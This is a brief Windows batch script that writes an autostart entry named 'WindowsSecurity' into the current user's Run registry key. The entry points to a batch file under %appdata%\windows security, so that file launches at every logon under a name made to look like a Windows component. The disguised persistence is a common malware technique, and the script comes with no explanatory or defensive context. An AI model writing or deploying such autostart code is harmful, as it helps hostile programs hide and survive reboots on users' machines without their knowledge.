@echo off
setlocal
set "batPath=%appdata%\windows security\windowssecurity.bat"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurity" /t REG_SZ /d "\"%batPath%\"" /f
exit
